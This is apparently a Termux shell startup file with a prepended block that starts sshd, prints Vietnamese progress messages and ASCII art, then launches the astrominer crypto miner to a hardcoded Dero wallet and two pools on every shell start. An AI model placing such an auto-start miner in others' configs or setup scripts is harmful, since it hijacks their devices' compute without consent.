sshd

echo "( ~~tool auto start mining ~~ )";
sleep 3

echo " chúc Ae đào coin thật nhiều tiền";
sleep 1

echo "load... đang lấy thông tin ✓ ";
sleep 2

echo "load... cập nhật lại thông tin✓";
sleep 2

echo "load... bất đầu login✓  ";
sleep 2
     echo "███████▄▄███████████▄ ";
echo "▓▓▓▓▓▓█░░░░░░░░░░░░░░█ ";
echo "▓▓▓▓▓▓█░░░░░░░░░░░░░░█ ";
echo "▓▓▓▓▓▓█░░░░░░░░░░░░░░█ ";
echo "▓▓▓▓▓▓█░░░░░░░░░░░░░░█ ";
echo "▓▓▓▓▓▓█░░░░░░░░░░░░░░█ "
echo "▓▓▓▓▓▓█░░░░░░░░░░░░░░█ ";
echo "██████▀░░░░░░░██████▀ ";
echo "         █░░░░█ ";
echo "         █░░░░█ ";
echo "           █░░█ ";
echo "           █░░█ ";
echo "            ▀*₫ ";
sleep 3
echo "load...  start ubuntu mining coin✓ ";
sleep 2

cd astrominer-v1.9.2

#chmod +x rpc_mining.sh

chmod u+x astrominer
./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcr6q657uplft9q9m5j3c -r community-pools.mysrv.cloud:10300 -r1 dero.rabidmining.com:10300 -p rpc
#./rpc_mining.sh

#   exec command immediately.
# - Do not save to history commands starting
#   with space.
# - Do not save duplicated commands.
shopt -s histappend
shopt -s histverify
export HISTCONTROL=ignoreboth

# Default command line prompt.
PROMPT_DIRTRIM=2
PS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '

# Handles nonexistent commands.
# If user has entered command which invokes non>
# utility, command-not-found will give a packag>
if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
        command_not_found_handle() {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
        }
fi
